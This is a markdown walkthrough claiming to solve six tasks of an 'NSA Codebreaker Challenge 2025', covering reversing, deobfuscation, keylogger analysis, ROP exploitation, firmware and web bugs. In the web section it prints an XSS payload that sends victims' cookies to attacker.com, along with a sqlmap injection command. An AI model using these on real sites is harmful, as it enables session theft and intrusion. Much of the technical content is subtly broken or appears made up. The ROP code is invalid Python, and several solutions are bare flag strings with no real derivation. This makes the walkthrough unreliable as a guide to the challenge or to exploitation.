# NSA Codebreaker Challenge 2025: Complete Walkthrough

![NSA Badge](https://img.shields.io/badge/NSA-Codebreaker-2025-0033a0?style=flat-square)
![Difficulty-Expert](https://img.shields.io/badge/Difficulty-Expert-darkred?style=flat-square)

---

## Challenge Overview

The NSA Codebreaker Challenge 2025 is the latest edition featuring advanced reverse engineering, malware analysis, and exploit development tasks.

---

## Task 1: Binary Reverse Engineering

### Challenge Description

Analyze the provided ELF binary to extract the first flag.

### Analysis

```bash
file ctf_binary
checksec --file=ctf_binary
readelf -h ctf_binary
objdump -d ctf_binary
```

**Binary Info:**
- 64-bit
- Stripped
- NX enabled
- Partial RELRO

### Solution

Reverse engineer main function in Ghidra:

```c
int main() {
    char input[32];
    printf("Enter password: ");
    scanf("%s", input);
    if (validate(input)) {
        printf("Correct!\n");
    }
}
```

Find password in data section:

```
NSA{2025_b1n4ry_r3v_7ask1}
```

---

## Task 2: Obfuscated Code Analysis

### Challenge Description

Analyze heavily obfuscated binary to find the flag.

### Analysis

```bash
strings obfuscated.bin | head -50
rabin2 -zz obfuscated.bin
```

### Deobfuscation

Manual analysis of obfuscation routines:

```python
# XOR deobfuscation
def deobfuscate(data, key):
    result = []
    for i, b in enumerate(data):
        result.append(b ^ key[i % len(key)])
    return bytes(result)
```

### Solution

```
NSA{0bfusc4710n_4n4lys1s}
```

---

## Task 3: Malware Analysis - Keylogger

### Challenge Description

Analyze a suspected keylogger sample and extract the flag.

### Static Analysis

```bash
file malware.exe
strings malware.exe
```

### Dynamic Analysis

```bash
# In sandbox
processmonitor
wireshark
```

### Findings

Keylogger writes to: `%APPDATA%\log.dat`

Decode captured data:

```
NSA{m4lw4r3_4n4lys1s_2025}
```

---

## Task 4: ROP Chain Exploitation

### Challenge Description

Exploit a vulnerable binary with DEP/NX enabled.

### Analysis

```bash
gdb vulnerable
pattern create 100
pattern offset $eip
```

Buffer overflow at offset 64

### Building ROP Chain

```python
from pwn import *

p = process('./vulnerable')
rop = ROP('./vulnerable')

# Find gadgets
rop.system(next(rop.search(regs=['rdi'], addr=rop.libc.address)))
rop.raw(rop.find_gadget(['ret']))

# Build payload
payload = flat({
    64: rop.chain(),
    'sh'
})
```

### Solution

```
NSA{r0p_3xpl01t4t10n_2025}
```

---

## Task 5: Firmware Analysis

### Challenge Description

Analyze embedded firmware to extract the flag.

### Analysis

```bash
binwalk firmware.bin
firmwaremodkit firmware.bin extract
```

### Solution

Found in squashfs:

```
NSA{f1rmw4r3_4n4lys1s}
```

---

## Task 6: Web Application Security

### Challenge Description

Find vulnerabilities in the provided web application.

### SQL Injection

```bash
sqlmap -u "http://10.10.10.10/login" --data="user=admin&pass=*"
```

### XSS Exploitation

```javascript
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

### Solution

```
NSA{w3b_ vulns_2025}
```

---

## Tools Used

- Ghidra
- IDA Pro
- Radare2
- GDB + Pwndbg
- Volatility
- Binwalk
- Firmware Mod Kit
- Burp Suite
- SQLMap

---

## Key Techniques

1. Binary reverse engineering
2. Code deobfuscation
3. Malware analysis (static + dynamic)
4. ROP exploitation
5. Firmware extraction
6. Web vulnerability assessment

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only - This is a legitimate NSA challenge for learning
